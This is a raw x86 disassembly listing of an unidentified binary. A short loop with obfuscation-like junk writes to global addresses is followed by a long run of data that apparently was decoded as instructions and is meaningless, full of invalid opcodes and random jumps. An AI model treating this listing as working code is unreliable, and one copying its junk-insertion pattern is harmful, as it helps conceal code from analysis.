  419fe6:	add    ecx,esi
  419fe8:	jmp    0x41a00c
  419fed:	mov    DWORD PTR ds:0x428010,0x3a90
  419ff7:	mov    dl,BYTE PTR [ebp-0x1]
  419ffa:	mov    DWORD PTR ds:0x42b000,0x1f96
  41a004:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41a00b:	inc    ecx
  41a00c:	mov    DWORD PTR ds:0x42b008,0x156a
  41a016:	cmp    ecx,0x40
  41a019:	mov    DWORD PTR ds:0x42b004,0x31d2
  41a023:	jb     0x419fed
  41a029:	sbb    edx,DWORD PTR ds:0x429018
  41a02f:	mov    edx,DWORD PTR [ebp-0x14]
  41a032:	dec    DWORD PTR ds:0x428028
  41a038:	xor    edx,eax
  41a03a:	add    edx,esi
  41a03c:	mov    DWORD PTR ds:0x42a00c,0x26bd
  41a046:	jmp    0x41c434
  41a04b:	mov    edi,DWORD PTR [ebp+0x8]
  41a04e:	jmp    0x41c3c9
  41a053:	ud1    esp,DWORD PTR [edx+edi*2-0x78941c5c]
  41a05b:	(bad)  
  41a05c:	mov    ch,0x8f
  41a05e:	std    
  41a05f:	std    
  41a060:	test   DWORD PTR [ecx+0x61005f96],ebx
  41a066:	bound  eax,QWORD PTR [edi+ebx*2]
  41a069:	bound  esp,QWORD PTR [edx-0x72]
  41a06c:	mov    bh,0xa1
  41a06e:	or     DWORD PTR [ebx],edi
  41a070:	sbb    DWORD PTR [ecx-0x2ae17e57],ebp
  41a076:	adc    BYTE PTR [ecx-0xa12831b],0x75
  41a07d:	ror    DWORD PTR [ebp+0xfae2faa],0xc5
  41a084:	mov    ebx,esi
  41a086:	ins    DWORD PTR es:[edi],dx
  41a087:	sub    eax,0xc4b744b3
  41a08c:	xchg   esi,eax
  41a08d:	aam    0x4
  41a08f:	xchg   esp,eax
  41a090:	mov    DWORD PTR [edi],edi
  41a092:	imul   edx,DWORD PTR [ecx+esi*4],0xffffffbd
  41a096:	dec    ebp
  41a097:	jb     0x41a022
  41a099:	cld    
  41a09a:	jno    0x41a031
  41a09c:	outs   dx,BYTE PTR ds:[esi]
  41a09d:	cdq    
  41a09e:	jns    0x41a082
  41a0a0:	jns    0x41a114
  41a0a2:	lds    eax,FWORD PTR [edx+0x3302785b]
  41a0a8:	repz into 
  41a0aa:	icebp  
  41a0ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0ac:	stos   DWORD PTR es:[edi],eax
  41a0ad:	jae    0x41a055
  41a0af:	mov    eax,0xbe3e7d4c
  41a0b4:	retf   
  41a0b5:	mov    al,0xf6
  41a0b7:	inc    BYTE PTR [ebp-0x5d]
  41a0ba:	mov    DWORD PTR [eax-0x7e9848ea],ebp
  41a0c0:	push   eax
  41a0c1:	mov    bl,0x75
  41a0c3:	out    dx,al
  41a0c4:	xor    ecx,DWORD PTR [esi+0x2c]
  41a0c7:	mov    ebp,0x44d76d04
  41a0cc:	leave  
  41a0cd:	sub    BYTE PTR [ebp-0x56],cl
  41a0d0:	jg     0x41a10b
  41a0d2:	int    0x85
  41a0d4:	mov    ecx,DWORD PTR [ecx+edx*4+0x27]
  41a0d8:	jnp    0x41a073
  41a0da:	xchg   esi,eax
  41a0db:	cmp    DWORD PTR [ecx],0xffffffca
  41a0de:	jno    0x41a0c7
  41a0e0:	loop   0x41a0e4
  41a0e2:	mov    ch,0x86
  41a0e4:	xor    DWORD PTR [ebp-0x1],esp
  41a0e7:	in     al,dx
  41a0e8:	adc    BYTE PTR ds:0xfd49938b,ch
  41a0ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0ef:	mov    eax,0xd0911437
  41a0f4:	in     eax,dx
  41a0f5:	lock mov di,0xe06e
  41a0fa:	sbb    DWORD PTR [edi-0x2ff41383],ebx
  41a100:	pop    ds
  41a101:	test   DWORD PTR [ebx],esi
  41a103:	sti    
  41a104:	cs dec esp
  41a106:	inc    edx
  41a107:	cs in  eax,dx
  41a109:	bound  esp,QWORD PTR [ecx+eiz*2-0x78504bd2]
  41a110:	retf   0x842d
  41a113:	ins    BYTE PTR es:[edi],dx
  41a114:	into   
  41a115:	and    al,dh
  41a117:	push   cs
  41a118:	(bad)  
  41a119:	sti    
  41a11a:	or     al,0x8b
  41a11c:	(bad)  
  41a11d:	jg     0x41a158
  41a11f:	jnp    0x41a155
  41a121:	adc    BYTE PTR [ebx-0xe],bh
  41a124:	jae    0x41a124
  41a126:	rcr    BYTE PTR [edi],cl
  41a128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a129:	adc    al,0x57
  41a12b:	mov    eax,0x6259122d
  41a130:	(bad)  
  41a131:	mov    esp,0xa24332ba
  41a136:	or     ecx,DWORD PTR ds:0xe03ac518
  41a13c:	adc    cl,ah
  41a13e:	cwde   
  41a13f:	scas   eax,DWORD PTR es:[edi]
  41a140:	xchg   ecx,eax
  41a141:	cmp    eax,0x889a014
  41a146:	ins    DWORD PTR es:[edi],dx
  41a147:	iret   
  41a148:	call   0x8a0a:0x32f514d9
  41a14f:	cmp    al,0xfb
  41a151:	cmp    bh,BYTE PTR ds:0xa917e246
  41a157:	xchg   esi,eax
  41a158:	mov    al,ah
  41a15a:	into   
  41a15b:	(bad)  [eax+0x4e]
  41a15e:	arpl   WORD PTR [esi],dx
  41a160:	pusha  
  41a161:	stos   BYTE PTR es:[edi],al
  41a162:	(bad)  
  41a163:	pop    esi
  41a164:	and    al,0xb6
  41a166:	cmp    ebx,esi
  41a168:	jge    0x41a136
  41a16a:	push   ds
  41a16b:	fisubr WORD PTR [ebp-0xe4f7053]
  41a171:	sbb    ah,BYTE PTR [edi+0x39]
  41a174:	mov    eax,ds:0x2630c59d
  41a179:	push   esi
  41a17a:	nop
  41a17b:	fsubr  QWORD PTR [edx+0x40bf9e72]
  41a181:	adc    cl,BYTE PTR [ebp+ebx*1+0x1b]
  41a185:	les    ebx,FWORD PTR [eax+0x3c]
  41a188:	push   edi
  41a189:	xchg   esp,eax
  41a18a:	jns    0x41a15b
  41a18c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a18d:	adc    esi,DWORD PTR [eax+0x56c14fc0]
  41a193:	push   ebx
  41a194:	and    BYTE PTR [edi+ecx*2+0x5e0673b1],al
  41a19b:	or     edi,DWORD PTR [edx]
  41a19d:	pop    gs
  41a19f:	sbb    eax,DWORD PTR [eax]
  41a1a1:	jmp    0x94bc:0x83e7ec9e
  41a1a8:	fsubr  st(0),st
  41a1aa:	fcomp  QWORD PTR [edi]
  41a1ac:	lods   al,BYTE PTR ds:[esi]
  41a1ad:	inc    esi
  41a1ae:	iret   
  41a1af:	xor    eax,0xa84a5feb
  41a1b4:	and    al,BYTE PTR [esi]
  41a1b6:	dec    esi
  41a1b7:	push   ebx
  41a1b8:	loop   0x41a163
  41a1ba:	adc    eax,0xa05b5123
  41a1bf:	sar    BYTE PTR [ebx+0x21],cl
  41a1c2:	sbb    al,0x81
  41a1c4:	pop    esi
  41a1c5:	popa   
  41a1c6:	fwait
  41a1c7:	xchg   edx,eax
  41a1c8:	push   ds
  41a1c9:	or     eax,0x52a50252
  41a1ce:	inc    ebp
  41a1cf:	fcom   QWORD PTR [esi+ecx*2]
  41a1d2:	push   cs
  41a1d3:	js     0x41a17e
  41a1d5:	sbb    al,0xa4
  41a1d7:	push   es
  41a1d8:	adc    DWORD PTR [ebx-0x14],esp
  41a1db:	xchg   bx,ax
  41a1dd:	out    dx,eax
  41a1de:	xchg   DWORD PTR [edi+edi*8],ebx
  41a1e1:	cmp    edi,DWORD PTR [edx]
  41a1e3:	imul   eax,DWORD PTR [ebx+0x6f],0xffffffa6
  41a1e7:	mov    bh,0x62
  41a1e9:	outs   dx,BYTE PTR ds:[esi]
  41a1ea:	inc    eax
  41a1eb:	retf   
  41a1ec:	sbb    al,0x6a
  41a1ee:	jp     0x41a185
  41a1f0:	stos   BYTE PTR es:[edi],al
  41a1f1:	mov    BYTE PTR [edi],ch
  41a1f3:	dec    ecx
  41a1f4:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1f6:	xor    bh,dl
  41a1f8:	les    eax,FWORD PTR [edx+0x20]
  41a1fb:	mov    eax,0xc0996a1f
  41a200:	idiv   bh
  41a202:	mov    ds:0x1d979b0d,eax
  41a207:	or     edx,DWORD PTR [ebp+0x2a60e2d]
  41a20d:	test   esi,0xdbca30d7
  41a213:	ficom  WORD PTR [ebx]
  41a215:	mov    bh,0xa6
  41a217:	adc    al,0xb7
  41a219:	(bad)  
  41a21a:	out    dx,al
  41a21b:	(bad)  
  41a21c:	dec    eax
  41a21d:	inc    edx
  41a21e:	xchg   ecx,eax
  41a21f:	xchg   BYTE PTR [edx-0x13],bh
  41a222:	call   0x1b7d7697
  41a227:	xor    al,0x5f
  41a229:	in     al,0xb0
  41a22b:	fidiv  WORD PTR [eax]
  41a22d:	sub    al,0xa1
  41a22f:	lahf   
  41a230:	popa   
  41a231:	mov    cl,0x74
  41a233:	rcr    DWORD PTR [edi-0x24999763],0xa1
  41a23a:	imul   edi,DWORD PTR ds:0x7c1bcdc3,0x1f
  41a241:	pop    ebx
  41a242:	cwde   
  41a243:	mov    WORD PTR [ecx+esi*4-0x79],fs
  41a247:	add    DWORD PTR [esi+0x74de403d],edi
  41a24d:	sbb    BYTE PTR [ecx-0x79be1f7c],ah
  41a253:	lods   eax,DWORD PTR ds:[esi]
  41a254:	sbb    ecx,eax
  41a256:	mov    eax,0xac43fe22
  41a25b:	inc    esi
  41a25c:	pop    ebx
  41a25d:	in     eax,0x52
  41a25f:	mov    ah,BYTE PTR ds:0x22b02ab2
  41a265:	repnz into 
  41a267:	jae    0x41a267
  41a269:	push   esp
  41a26a:	jb     0x41a24d
  41a26c:	popf   
  41a26d:	jge    0x41a213
  41a26f:	cmp    eax,0x3408ce8f
  41a274:	push   0xfffffff6
  41a276:	outs   dx,DWORD PTR ds:[esi]
  41a277:	imul   ebp,DWORD PTR [ebp-0x1324b955],0x6ab18db
  41a281:	jecxz  0x41a2e6
  41a283:	ret    0xc3fc
  41a286:	xchg   cl,ch
  41a288:	lds    eax,FWORD PTR [edi+0x79]
  41a28b:	cmp    DWORD PTR [ebx+0x73],0x29
  41a28f:	test   al,0x3f
  41a291:	inc    esi
  41a292:	ret    
  41a293:	inc    edx
  41a294:	dec    eax
  41a295:	inc    ebx
  41a296:	aam    0x3f
  41a298:	stc    
  41a299:	lock sub edx,ebp
  41a29c:	aaa    
  41a29d:	adc    bh,BYTE PTR ds:0x93818ac
  41a2a3:	jl     0x41a28b
  41a2a5:	hlt    
  41a2a6:	sub    al,0xb7
  41a2a8:	sbb    al,0xdf
  41a2aa:	mov    WORD PTR [ebx-0x5aa6e652],?
  41a2b0:	rol    cl,0x57
  41a2b3:	mov    dl,0xd8
  41a2b5:	mov    bh,0x6a
  41a2b7:	aas    
  41a2b8:	and    eax,0xef61bb32
  41a2bd:	xor    esi,DWORD PTR [eax-0x1c]
  41a2c0:	jmp    0x2eb2:0xfc6200ba
  41a2c7:	mov    ebx,0xa1dfeab6
  41a2cc:	outs   dx,BYTE PTR ds:[esi]
  41a2cd:	gs dec ecx
  41a2cf:	sar    DWORD PTR [eax],0xca
  41a2d2:	jnp    0x41a348
  41a2d4:	cmp    ch,ah
  41a2d6:	scas   al,BYTE PTR es:[edi]
  41a2d7:	and    al,0x73
  41a2d9:	(bad)  
  41a2da:	addr16 ds xor edx,edx
  41a2de:	fcmovnb st,st(6)
  41a2e0:	pop    edx
  41a2e1:	(bad)  
  41a2e4:	cmp    BYTE PTR [edx+0x52797b3f],bl
  41a2ea:	fisttp DWORD PTR [edi-0x26]
  41a2ed:	xchg   edx,eax
  41a2ee:	and    esi,DWORD PTR [edx-0x2498a051]
  41a2f4:	(bad)  
  41a2f5:	jno    0x41a344
  41a2f7:	mov    esp,DWORD PTR [ebx-0x72349afd]
  41a2fd:	push   esp
  41a2fe:	inc    edi
  41a2ff:	or     eax,0x37a1ceca
  41a304:	out    0xf4,eax
  41a306:	adc    dh,BYTE PTR es:[edx+ebp*8-0x42]
  41a30b:	js     0x41a28e
  41a30d:	loope  0x41a332
  41a30f:	loope  0x41a2c0
  41a311:	cmp    edi,DWORD PTR [ebx-0x77]
  41a314:	pop    esp
  41a315:	out    0xc4,al
  41a317:	(bad)  
  41a319:	sub    BYTE PTR ds:[esi-0x59],dh
  41a31d:	jbe    0x41a32b
  41a31f:	mov    WORD PTR [edx-0x552d9747],ss
  41a325:	retf   
  41a326:	mov    al,ds:0x8250398d
  41a32b:	jmp    0x62e4:0xdc4ae79
  41a332:	cmp    DWORD PTR [edi-0x53],0x6fd46cb7
  41a339:	sar    DWORD PTR [edx+ebp*2+0x65],0x2f
  41a33e:	add    al,0x57
  41a340:	cmp    al,0x5a
  41a342:	fucom  st(4)
  41a344:	imul   di,WORD PTR [edx+esi*1+0x2],0x6ff
  41a34b:	jmp    0xd2094787
  41a350:	cdq    
  41a351:	fistp  DWORD PTR [edx-0x406a07ed]
  41a357:	pop    es
  41a358:	(bad)  
  41a359:	aaa    
  41a35a:	mov    al,0x54
  41a35c:	inc    ebp
  41a35d:	mov    edi,DWORD PTR [ecx-0x72]
  41a360:	sahf   
  41a361:	cs es pop ebp
  41a364:	jo     0x41a335
  41a366:	dec    ebp
  41a367:	dec    eax
  41a368:	inc    ebx
  41a369:	jns    0x41a301
  41a36b:	int    0x8e
  41a36d:	mov    ecx,0xe41af747
  41a372:	jge    0x41a360
  41a374:	inc    ebx
  41a375:	leave  
  41a376:	push   edx
  41a377:	lods   eax,DWORD PTR ds:[esi]
  41a378:	or     eax,0x692c8cfa
  41a37d:	inc    eax
  41a37e:	std    
  41a37f:	lock std 
  41a381:	jae    0x41a305
  41a383:	mov    ch,0x45
  41a385:	push   0x56
  41a387:	jo     0x41a399
  41a389:	ja     0x41a39b
  41a38b:	ret    
  41a38c:	sub    DWORD PTR [edi+0x43],ebp
  41a38f:	push   edi
  41a390:	pop    esi
  41a391:	in     al,dx
  41a392:	fld    DWORD PTR [eax]
  41a394:	imul   edx,DWORD PTR [edi+0x5b73602e],0x5bf2ca2c
  41a39e:	(bad)  
  41a39f:	sbb    DWORD PTR [edi+0x63],ebp
  41a3a2:	pusha  
  41a3a3:	idiv   DWORD PTR [eax-0x5a]
  41a3a6:	cwde   
  41a3a7:	loope  0x41a369
  41a3a9:	call   0xc778d8d7
  41a3ae:	pop    ss
  41a3af:	mov    ds:0x70d1c3e5,eax
  41a3b4:	adc    DWORD PTR [ecx],ecx
  41a3b6:	dec    esi
  41a3b7:	cmp    al,bh
  41a3b9:	mov    al,0xd3
  41a3bb:	lea    ebp,[ecx-0x7f28b1c8]
  41a3c1:	inc    edi
  41a3c2:	sub    al,0x51
  41a3c4:	scas   al,BYTE PTR es:[edi]
  41a3c5:	enter  0x266a,0x1c
  41a3c9:	fnstsw WORD PTR [ebp*4-0x1cc5a8db]
  41a3d0:	mov    DWORD PTR [ebx-0x12],ecx
  41a3d3:	push   edx
  41a3d4:	std    
  41a3d5:	jne    0x41a3c0
  41a3d7:	xchg   ebx,ebx
  41a3d9:	pop    ds
  41a3da:	push   ss
  41a3db:	hlt    
  41a3dc:	nop
  41a3dd:	fnsave [ecx-0x260ff1de]
  41a3e3:	loop   0x41a40a
  41a3e5:	iret   
  41a3e6:	sar    ecx,cl
  41a3e8:	repnz das 
  41a3ea:	out    dx,al
  41a3eb:	xchg   esi,eax
  41a3ec:	sbb    bl,BYTE PTR [eax]
  41a3ee:	mov    esi,DWORD PTR [edi]
  41a3f0:	adc    dh,ch
  41a3f2:	cmc    
  41a3f3:	repz pop ebp
  41a3f5:	test   eax,0x29300958
  41a3fa:	frstor [ebx-0x6dbd8a94]
  41a400:	das    
  41a401:	fwait
  41a402:	push   cs
  41a403:	add    eax,0xcbc88ff7
  41a408:	test   al,0x6a
  41a40a:	fisubr WORD PTR [ebx+0x77]
  41a40d:	call   0xb5e445aa
  41a412:	stos   BYTE PTR es:[edi],al
  41a413:	stos   DWORD PTR es:[edi],eax
  41a414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a415:	sub    al,0x22
  41a417:	jbe    0x41a45d
  41a419:	fcom   QWORD PTR [ebx+0x19]
  41a41c:	adc    BYTE PTR [ecx],dh
  41a41e:	fdiv   QWORD PTR [ecx+edi*8]
  41a421:	call   0xf77d:0x77808008
  41a428:	cld    
  41a429:	std    
  41a42a:	or     dl,BYTE PTR [eax-0x5d]
  41a42d:	mov    ss,ebp
  41a42f:	pop    ds
  41a430:	mov    ecx,0x58617326
  41a435:	dec    esi
  41a436:	xor    eax,0x4d72229f
  41a43b:	xchg   edi,eax
  41a43c:	(bad)  
  41a43e:	out    dx,al
  41a43f:	sbb    al,0x7b
  41a441:	jge    0x41a406
  41a443:	addr16 iret 
  41a445:	or     DWORD PTR [ebx],edi
  41a447:	scas   al,BYTE PTR es:[edi]
  41a448:	cmp    BYTE PTR [ecx+0x48],0x7
  41a44c:	pop    ss
  41a44d:	cld    
  41a44e:	xchg   ebp,eax
  41a44f:	push   ebx
  41a450:	loope  0x41a4af
  41a452:	add    cl,BYTE PTR [edi-0x5eea88d1]
  41a458:	in     eax,0xf3
  41a45a:	cli    
  41a45b:	and    esi,DWORD PTR [edi+ebx*2]
  41a45e:	(bad)  
  41a45f:	pop    ds
  41a460:	adc    dl,BYTE PTR [ebx+0x5]
  41a463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a464:	mov    ebp,eax
  41a466:	cwde   
  41a467:	mov    ds:0xfdad1318,eax
  41a46c:	gs loop 0x41a436
  41a46f:	jo     0x41a3f9
  41a471:	push   edx
  41a472:	mov    eax,ds:0xe89c1257
  41a477:	and    ebx,DWORD PTR [esi-0x36]
  41a47a:	test   DWORD PTR [ebx+edx*8-0x2a068033],0x597edfe5
  41a485:	sub    eax,0x60390df9
  41a48a:	test   BYTE PTR [ecx+0xc],dh
  41a48d:	add    eax,0xaccfd66e
  41a492:	pop    ds
  41a493:	mov    bh,0xa6
  41a495:	xor    bl,BYTE PTR [esi]
  41a497:	sbb    eax,0x889335c0
  41a49c:	jmp    FWORD PTR [ecx]
  41a49e:	or     al,0x4
  41a4a0:	mov    cl,0x15
  41a4a2:	lock das 
  41a4a4:	lds    ecx,FWORD PTR [ecx+0x1a]
  41a4a7:	out    0x76,eax
  41a4a9:	rcl    BYTE PTR [esi*4-0x4238ceca],cl
  41a4b0:	jae    0x41a474
  41a4b2:	ins    DWORD PTR es:[edi],dx
  41a4b3:	and    cl,BYTE PTR [esi]
  41a4b5:	cli    
  41a4b6:	jp     0x41a4ce
  41a4b8:	stc    
  41a4b9:	mov    dl,0xc9
  41a4bb:	mov    al,ds:0x83ba662f
  41a4c0:	in     eax,0x42
  41a4c2:	ja     0x41a52c
  41a4c4:	mov    al,0xe4
  41a4c6:	mov    DWORD PTR [eax+0x4dcfd734],ebx
  41a4cc:	dec    ebp
  41a4cd:	or     ebp,0x4170b67a
  41a4d3:	and    eax,0x684daa8e
  41a4d8:	repnz pop eax
  41a4da:	add    al,0x92
  41a4dc:	cdq    
  41a4dd:	sbb    bl,BYTE PTR [ecx]
  41a4df:	xchg   edx,eax
  41a4e0:	and    DWORD PTR [ebp+0x3ed1438d],0xc48daf66
  41a4ea:	retf   
  41a4eb:	adc    ebx,DWORD PTR [ebp+0x3f3d3282]
  41a4f1:	aam    0xa4
  41a4f3:	or     al,0xe5
  41a4f5:	ins    BYTE PTR es:[edi],dx
  41a4f6:	and    eax,edi
  41a4f8:	mov    ecx,0xf1fb8242
  41a4fd:	and    ecx,DWORD PTR [esi-0x1]
  41a500:	xchg   ebx,eax
  41a501:	push   ebx
  41a502:	jne    0x41a490
  41a504:	inc    ecx
  41a505:	xor    BYTE PTR [ebx],dh
  41a507:	jecxz  0x41a57b
  41a509:	int    0x9d
  41a50b:	sub    al,0x16
  41a50d:	and    al,BYTE PTR [edi]
  41a50f:	jb     0x41a4a0
  41a511:	jo     0x41a4bb
  41a513:	ret    
  41a514:	xor    ch,cl
  41a516:	jnp    0x41a4a7
  41a518:	sub    edx,DWORD PTR [eax+0x55]
  41a51b:	lds    eax,FWORD PTR [ebx+0x1b]
  41a51e:	aad    0xfc
  41a520:	imul   ecx,DWORD PTR [edi],0x816a801
  41a526:	(bad)  
  41a527:	icebp  
  41a528:	popa   
  41a529:	add    bh,0x77
  41a52c:	add    edx,DWORD PTR [ebp+0x1090e538]
  41a532:	mov    edx,0xf8faf2f
  41a537:	pop    ebp
  41a538:	jp     0x41a583
  41a53a:	xor    esi,0x85b1f751
  41a540:	arpl   WORD PTR [ebx],si
  41a542:	push   0x785e5b1d
  41a547:	push   esp
  41a548:	mov    al,0x22
  41a54a:	repz lds ecx,FWORD PTR [edi]
  41a54d:	or     DWORD PTR [edx-0x16a5d915],edi
  41a553:	mov    ecx,0x83f2e9e2
  41a558:	xchg   edi,eax
  41a559:	mov    WORD PTR [ecx-0x73],fs
  41a55c:	in     al,0xc6
  41a55e:	xchg   ebp,eax
  41a55f:	sbb    al,0x5a
  41a561:	das    
  41a562:	push   edi
  41a563:	inc    ecx
  41a564:	pop    es
  41a565:	inc    BYTE PTR [esi-0x7e183375]
  41a56b:	and    dh,BYTE PTR [esi+0xf413200]
  41a571:	adc    al,0x4a
  41a573:	push   ss
  41a574:	add    BYTE PTR [ecx],ch
  41a576:	sub    eax,0xcd1567b7
  41a57b:	jecxz  0x41a596
  41a57d:	je     0x41a5c6
  41a57f:	cli    
  41a580:	sub    BYTE PTR [edx+0x71],dl
  41a583:	dec    esp
  41a584:	cmp    al,0x5d
  41a586:	mov    bl,0xf9
  41a588:	push   cs
  41a589:	(bad)  
  41a58a:	mov    ah,0xad
  41a58c:	add    eax,0xacbab7f3
  41a591:	mov    esi,0x9b85c213
  41a596:	jns    0x41a573
  41a598:	cwde   
  41a599:	test   bh,0xc7
  41a59c:	mov    edx,0x8cc7d6b
  41a5a1:	xor    BYTE PTR [edx-0x26],al
  41a5a4:	mov    WORD PTR [esi],?
  41a5a6:	jns    0x41a618
  41a5a8:	inc    ebp
  41a5a9:	xlat   BYTE PTR ds:[ebx]
  41a5aa:	sbb    eax,0xd03724c4
  41a5af:	shl    BYTE PTR [edx+0x3748419c],cl
  41a5b5:	jmp    0xd837:0x254d1ef0
  41a5bc:	out    dx,eax
  41a5bd:	aas    
  41a5be:	push   edi
  41a5bf:	inc    ecx
  41a5c0:	mov    al,ds:0x8175575b
  41a5c5:	pop    edx
  41a5c6:	cmp    eax,0x53f6ece5
  41a5cb:	inc    ebx
  41a5cc:	cmp    DWORD PTR [edx+0x6],0x37
  41a5d0:	jns    0x41a622
  41a5d2:	pop    ecx
  41a5d3:	hlt    
  41a5d4:	ds pop esi
  41a5d6:	inc    edi
  41a5d7:	pop    eax
  41a5d8:	mov    bl,0x34
  41a5da:	and    al,0x5
  41a5dc:	loopne 0x41a5f5
  41a5de:	cld    
  41a5df:	jne    0x41a630
  41a5e1:	or     DWORD PTR [eax+0x7f],eax
  41a5e4:	imul   ah
  41a5e6:	sub    eax,0x8c037a83
  41a5eb:	test   DWORD PTR ds:0x450cdd81,esp
  41a5f1:	xchg   ebp,eax
  41a5f2:	mov    bh,0xc8
  41a5f4:	pop    ecx
  41a5f5:	push   cs
  41a5f6:	and    eax,0x5689e0dc
  41a5fb:	int3   
  41a5fc:	je     0x41a603
  41a5fe:	fmul   st(4),st
  41a600:	nop
  41a601:	sbb    DWORD PTR [esi-0x44],0xfffffff2
  41a605:	sbb    dh,BYTE PTR [eax+0x7f]
  41a608:	dec    ebx
  41a609:	xchg   ecx,eax
  41a60a:	dec    esp
  41a60b:	loope  0x41a5e8
  41a60d:	pop    edx
  41a60e:	sub    ah,bl
  41a610:	or     esi,ecx
  41a612:	mov    ebp,0xf763b20a
  41a617:	clc    
  41a618:	pop    ecx
  41a619:	scas   eax,DWORD PTR es:[edi]
  41a61a:	adc    bl,BYTE PTR [esi]
  41a61c:	repnz xchg ebx,eax
  41a61e:	xor    bh,BYTE PTR [esi-0x4d]
  41a621:	stos   BYTE PTR es:[edi],al
  41a622:	mov    ecx,0xd082a5ff
  41a627:	ins    DWORD PTR es:[edi],dx
  41a628:	popf   
  41a629:	loop   0x41a608
  41a62b:	dec    ecx
  41a62c:	and    BYTE PTR [esi],0xf0
  41a62f:	xchg   esi,eax
  41a630:	adc    BYTE PTR [ebp+0x2264cecd],al
  41a636:	lods   al,BYTE PTR ds:[esi]
  41a637:	pop    ecx
  41a638:	test   BYTE PTR [edi],ah
  41a63a:	cmp    eax,0x54183876
  41a63f:	or     bh,BYTE PTR [ebp-0x6a344192]
  41a645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a646:	(bad)  
  41a647:	jmp    0xae89d848
  41a64c:	shr    DWORD PTR [ecx],1
  41a64e:	aaa    
  41a64f:	fisttp WORD PTR [ebp+0x42]
  41a652:	mov    edi,0xeef488cb
  41a657:	or     DWORD PTR [ecx],esi
  41a659:	mov    ds:0x3fa1b024,al
  41a65e:	jmp    0x12eb:0x893657bc
  41a665:	add    al,0xa2
  41a667:	sahf   
  41a668:	fucomip st,st(1)
  41a66a:	pop    eax
  41a66b:	add    BYTE PTR [ebp-0x75],ah
  41a66e:	jb     0x41a69b
  41a670:	shl    BYTE PTR [ebp-0x5],0x5c
  41a674:	pop    ebx
  41a675:	cli    
  41a676:	sti    
  41a677:	sahf   
  41a678:	pop    ss
  41a679:	push   edx
  41a67a:	adc    ecx,ebp
  41a67c:	cmp    eax,0x0
  41a67f:	pop    eax
  41a680:	jnp    0x41a697
  41a682:	or     al,0xd
  41a684:	lods   eax,DWORD PTR ds:[esi]
  41a685:	outs   dx,BYTE PTR ds:[esi]
  41a686:	aad    0x1f
  41a688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a689:	mov    BYTE PTR ds:0x62baa10f,dh
  41a68f:	mov    eax,ds:0x348f492
  41a694:	repnz push ds
  41a696:	xor    eax,esp
  41a698:	aad    0xdc
  41a69a:	ins    BYTE PTR es:[edi],dx
  41a69b:	aaa    
  41a69c:	pop    esi
  41a69d:	pop    ebx
  41a69e:	inc    esi
  41a69f:	jmp    0x39250a5c
  41a6a4:	aad    0xe0
  41a6a6:	(bad)  [eax-0x28]
  41a6a9:	xor    ebx,DWORD PTR [esi+edi*4+0x4e]
  41a6ad:	sub    edi,DWORD PTR [esi-0x781bd62b]
  41a6b3:	jns    0x41a6ea
  41a6b5:	cli    
  41a6b6:	mov    al,ss:0xd97b9304
  41a6bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6bd:	and    BYTE PTR [edi+0x3663b90],0x93
  41a6c4:	rcr    BYTE PTR [ecx],0x5a
  41a6c7:	cmp    dl,dl
  41a6c9:	aam    0xee
  41a6cb:	js     0x41a741
  41a6cd:	dec    esp
  41a6ce:	mov    ds:0x8506444d,al
  41a6d3:	xor    eax,0xb4d54cd7
  41a6d8:	xlat   BYTE PTR ds:[ebx]
  41a6d9:	adc    eax,0xb63dbd0e
  41a6de:	pop    esi
  41a6df:	push   ebp
  41a6e0:	add    ebp,ecx
  41a6e2:	stc    
  41a6e3:	neg    ebp
  41a6e5:	fmul   QWORD PTR [ecx+0x7e]
  41a6e8:	lahf   
  41a6e9:	ror    ebp,0x1
  41a6ec:	jge    0x41a6a6
  41a6ee:	sbb    al,0xcc
  41a6f0:	inc    esp
  41a6f1:	or     ah,BYTE PTR [esi]
  41a6f3:	mov    ebp,0xfb4474a9
  41a6f8:	pusha  
  41a6f9:	loope  0x41a71e
  41a6fb:	aam    0xe7
  41a6fd:	jl     0x41a6b4
  41a6ff:	sbb    BYTE PTR [edi+ebp*4],al
  41a702:	scas   eax,DWORD PTR es:[edi]
  41a703:	adc    eax,0x3dfe48d5
  41a708:	(bad)  
  41a709:	cmp    al,BYTE PTR [edx+0xd9cc8d0]
  41a70f:	mov    ds:0xc85eadc1,al
  41a714:	fiadd  WORD PTR [ebp+0x12]
  41a717:	out    dx,eax
  41a718:	xor    DWORD PTR [edx+0x22d265c6],eax
  41a71e:	mov    ds,WORD PTR [ebx+0x5e]
  41a721:	ficom  DWORD PTR [esi+0x599b597f]
  41a727:	push   ss
  41a728:	pop    esi
  41a729:	and    eax,0xba662362
  41a72e:	xchg   ecx,eax
  41a72f:	hlt    
  41a730:	ds cmp eax,0xda7a450d
  41a736:	push   cs
  41a737:	je     0x41a735
  41a739:	js     0x41a742
  41a73b:	jb     0x41a716
  41a73d:	xchg   BYTE PTR [ecx+eax*8-0x38830017],dl
  41a744:	int    0xb0
  41a746:	mov    ch,cl
  41a748:	mov    cs,WORD PTR [esi]
  41a74a:	aad    0x71
  41a74c:	mov    ch,0x14
  41a74e:	add    DWORD PTR [ebx],ebp
  41a750:	sbb    BYTE PTR [ecx-0x76],dh
  41a753:	std    
  41a754:	fidiv  WORD PTR [edx+edx*4+0x13]
  41a758:	(bad)  
  41a759:	jbe    0x41a7d7
  41a75b:	lock mov edi,DWORD PTR [eax-0x513f0db7]
  41a762:	rcl    BYTE PTR [eax-0x25],cl
  41a765:	lock adc bh,bh
  41a768:	fist   WORD PTR [esi-0x78f90e80]
  41a76e:	fwait
  41a76f:	jmp    0x10cfd9e4
  41a774:	pop    esp
  41a775:	sub    eax,0x297c52a0
  41a77a:	jne    0x41a70f
  41a77c:	cmc    
  41a77d:	xchg   DWORD PTR [esi+ebp*2+0x20],esp
  41a781:	daa    
  41a782:	in     eax,0xed
  41a784:	sbb    al,0xeb
  41a786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a787:	or     BYTE PTR [esi-0x5d4b1699],cl
  41a78d:	loop   0x41a7bc
